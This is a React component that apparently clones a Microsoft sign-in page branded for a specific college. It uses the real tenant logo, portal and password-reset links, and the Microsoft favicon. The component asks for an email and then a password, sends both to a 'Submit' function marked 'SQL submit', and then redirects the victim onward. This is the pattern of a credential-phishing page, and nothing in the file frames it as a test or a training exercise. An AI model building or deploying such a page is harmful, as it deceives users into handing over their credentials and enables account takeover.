import React, { useEffect, useState } from "react";
import iconSource from "../images/microsofticon.ico";
import { AnimatePresence, motion } from "motion/react";
import backArrow from "../images/logbackarrow.svg";
import Submit from "./Submit";
import { useWindowDimensions } from "./App";

const Login = (props: { next: string }) => {
  const { width } = useWindowDimensions();
  const title = "Sign in to your account";
  const icon = iconSource;
  const [useIsPassword, setIsPassword] = useState(false);
  const [useBackAndForth, setBackAndForth] = useState("100%");
  const [usePass, setPass] = useState("");
  const [useResponse, setResponse] = useState("");
  const [isVisible, setIsVisible] = useState(true);
  const [useEmail, setEmail] = useState("");
  const handleSubmit = async () => {
    // SQL submit
    let response = Submit(useEmail, usePass);
    setResponse(await response);
    window.location.href = props.next;
  };

  let tmp = "";
  let tmp2 = "";
  let tmp3 = "";
  let tmp4 = "";
  let tmp5 = "";

  if (width < 600) {
    tmp = "w-screen h-screen fixed bg-white opacity-[100%] z-25 ";
    tmp2 = "z-0 w-screen w-[90%] absolute";
    tmp3 =
      "w-[440px] h-[416px] m-auto shadow-stone-900  z-50 text-[.9375rem] transition-all";
    tmp4 = "text-[#747474] h-fit inline-flex text-[12px] items-center";
    tmp5 = "block fixed bottom-[4px] z-50 h-6";
  } else {
    tmp = "w-screen h-screen fixed bg-black opacity-[55%] z-25 ";
    tmp2 = "z-0 w-screen h-[98vh] flex items-center absolute";
    tmp3 =
      "w-[440px] h-[416px] m-auto shadow-stone-900 shadow-md z-50 text-[.9375rem] transition-all";
    tmp4 = "text-white h-fit inline-flex text-[12px] items-center";
    tmp5 = "block fixed bottom-[4px] right-0 z-50 h-6";
  }

  useEffect(() => {
    setBackAndForth("100%");
    document.title = title;
    const link: HTMLLinkElement | null =
      document.querySelector("link[rel*='icon']") ||
      document.createElement("link");
    link.type = "image/x-icon";
    link.rel = "shortcut icon";
    link.href = icon;
    document.getElementsByTagName("head")[0].appendChild(link);
  }, [title, icon]);
  return (
    <div className="loginBody">
      <div className="loginBackgroundGradient z-0 fixed w-screen h-screen"></div>
      <div className={tmp}></div>

      <div className={tmp2}>
        {!useIsPassword && (
          <div className={tmp3}>
            <div className="w-full h-full bg-white overflow-hidden relative">
              <div className="pt-[44px] px-[44px]">
                <img
                  src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
                  alt="TMP"
                  className="h-[36px]"
                />
              </div>
              <div className="w-full bg-[#f2f2f2] h-[20%] absolute bottom-0"></div>
              <AnimatePresence>
                {isVisible ? (
                  <motion.div
                    className=" font-medium  h-[80%]"
                    transition={{ type: "tween", ease: "easeOut" }}
                    initial={{ x: useBackAndForth }}
                    animate={{ x: "0" }}
                    exit={{ x: "-100%" }}
                  >
                    <div className="px-[44px] h-[75%]">
                      <div>
                        <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
                          Sign in
                        </h1>
                        <input
                          type="text"
                          placeholder="Please enter email address here"
                          value={useEmail}
                          onChange={(e) => {
                            setEmail(e.target.value);
                          }}
                          className="w-full loginInputBorder box-border p-[2px] pt-[13px] pb-[7px] text-black border-[rgba(0, 0, 0, 0.4)]"
                        />
                        <div>
                          <div className="flex text-[.8125rem]">
                            <p className="text-black">
                              <a
                                className="text-[#0067b8]  inline-block pt-[16px] pl-[2px] block hover:text-stone-700 hover:underline"
                                href="https://login.microsoftonline.com/14f58afa-abfc-4c24-8b2b-cec4fc6f7fe6/wsfed?wa=wsignin1.0&wtrealm=https%3a%2f%2fsisportal-100925.campusnexus.cloud%2fCMCPortal%2f&wct=2025-04-02T21%3a00%3a20Z&wctx=rm%3d0%26id%3dpassive%26ru%3dsecure%2fstudent%2fstuportal.aspx&wreply=https%3a%2f%2fmyswtc.swtc.edu%2fCMCPortal%2f&AppType=Portal&Role=STUDENT#"
                              >
                                Can’t access your account?
                              </a>
                            </p>
                          </div>
                          <div className="w-[108px] min-h-[32px] float-right">
                            <button
                              type="submit"
                              onClick={() => {
                                setIsVisible(false);
                                setTimeout(() => {
                                  setIsPassword(true);
                                }, 250);
                              }}
                              className="bg-[#0067b8] active:bg-[rgba(0,0,0,0.4)] active:scale-[95%] mt-[16px] focus-visible:outline focus-visible:border-[0] active:outline-[0] focus:outline outline-black rounded-[0] w-full h-[32px] focus:underline font-normal py-[4px] hover:bg-[#005da6] focus:bg-[#005da6] "
                            >
                              Next
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="w-full h-[25%] relative">
                      <div className="pt-[23px] pl-[44px]">
                        <a
                          className="text-[#0067b8] fixed z-50 hover:text-stone-700 hover:underline"
                          href="https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=f97b3686-bc70-4fee-b56d-f45878420d15&redirect_uri=https%3A%2F%2Fapp.schoology.com%2Flogin%2Fexternal_accounts%2Freceive%2Fmicrosoft&state=c2NoZW1lPWh0dHBzJmhvc3Q9c3d0Yy5zY2hvb2xvZ3kuY29tJnBhdGg9JTJGbG9naW4lMkZleHRlcm5hbF9hY2NvdW50cyUyRnJlY2VpdmUlMkZtaWNyb3NvZnQmcXVlcnk9c2Nob29sX25pZCUzRDUwODQxNTM5OSZzY2hvb2xfbmlkPTUwODQxNTM5OSZzX2N1c3RvbV9kb21haW49aHR0cHMlM0ElMkYlMkZzd3RjLnNjaG9vbG9neS5jb20mZGVzdGluYXRpb249bG9naW4lMkZleHRlcm5hbF9hY2NvdW50cyUyRnNlbmQlMkZtaWNyb3NvZnQlM0ZzY2hvb2xfbmlkJTNENTA4NDE1Mzk5JnRzPTE3NDI5OTY1NTQmdG9rZW49TlVFSzdaSkVKTkFOVDdKS0E3M0M5Njg5RTgzRjgzRkQwODFFQjA5MTIxOTYzMTZFJmhhc2g9NzllZmFiNDcyNzdjOWVjYzQ5ODE2MjYzNjRiN2I5YTM%3D&scope=openid%26email&nonce=67e4044ad9bbf#"
                        >
                          Password Reset Knowledgebase
                        </a>
                      </div>
                    </div>
                  </motion.div>
                ) : null}
              </AnimatePresence>
            </div>
          </div>
        )}
        {useIsPassword && (
          <div className={tmp3}>
            <div className="w-full h-full bg-white overflow-hidden relative">
              <div className="pt-[44px] px-[44px]">
                <img
                  src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
                  alt="TMP"
                  className="h-[36px]"
                />
              </div>
              <div className="w-full bg-[#f2f2f2] h-[20%] absolute bottom-0"></div>
              <AnimatePresence>
                {!isVisible ? (
                  <motion.div
                    className=" font-medium  h-[80%]"
                    transition={{ type: "tween", ease: "easeOut" }}
                    initial={{ x: "100%" }}
                    animate={{ x: "0" }}
                    exit={{ x: "100%" }}
                  >
                    <div className="px-[44px] h-[75.923749%]">
                      <div>
                        <div className="inline-flex mt-4">
                          <img
                            src={backArrow}
                            alt="TMP"
                            onClick={() => {
                              setBackAndForth("-100%");
                              setIsVisible(true);
                              setTimeout(() => {
                                setIsPassword(false);
                                setPass("");
                              }, 250);
                            }}
                            className="mr-[2px] hover:cursor-pointer hover:bg-[rgba(0,0,0,0.1)] rounded-full active:bg-[rgba(0,0,0,0.4)]"
                          />
                          <p className="text-stone-700 leading-[24px]">
                            {useEmail}
                          </p>
                        </div>
                        <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
                          Enter password {useResponse}
                        </h1>
                        <input
                          type="password"
                          placeholder="Password"
                          value={usePass}
                          onChange={(e) => {
                            setPass(e.target.value);
                          }}
                          className="w-full loginInputBorder box-border p-[2px] pt-[13px] pb-[7px] text-black border-[rgba(0, 0, 0, 0.4)]"
                        />
                        <div>
                          <a
                            className="text-[#0067b8] pt-[16px] pl-[2px] text-[.8125rem] block hover:text-stone-700 hover:underline"
                            href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
                          >
                            Forgot my password
                          </a>
                          <div className="w-[108px] min-h-[32px] float-right">
                            <button
                              type="submit"
                              onClick={() => {
                                handleSubmit();
                              }}
                              className="bg-[#0067b8] active:bg-[rgba(0,0,0,0.4)] active:scale-[95%] mt-[16px] focus-visible:outline focus-visible:border-[0] active:outline-[0] focus:outline outline-black rounded-[0] w-full h-[32px] focus:underline font-normal py-[4px] hover:bg-[#005da6] focus:bg-[#005da6] "
                            >
                              Sign in
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="w-full h-[25%]">
                      <div className="pt-[23px] pl-[44px] fixed z-50">
                        <a
                          className="text-[#0067b8] hover:text-stone-700  hover:underline"
                          href="https://kb.swtc.edu/password"
                        >
                          Password Reset Knowledgebase
                        </a>
                      </div>
                    </div>
                  </motion.div>
                ) : null}
              </AnimatePresence>
            </div>
          </div>
        )}
      </div>
      <div className={tmp5}>
        <div className={tmp4}>
          <a
            className="mx-[11px] hover:underline"
            href="https://www.microsoft.com/en-US/servicesagreement/"
          >
            Terms of use
          </a>
          <a
            className="mx-[8px] hover:underline"
            href="https://privacy.microsoft.com/en-US/privacystatement"
          >
            Privacy & cookies
          </a>
          <p className="mx-[11px] text-[17px] mr-[8px] font-semibold leading-[22px] cursor-pointer mb-1.5 tracking-[3px]">
            ...
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
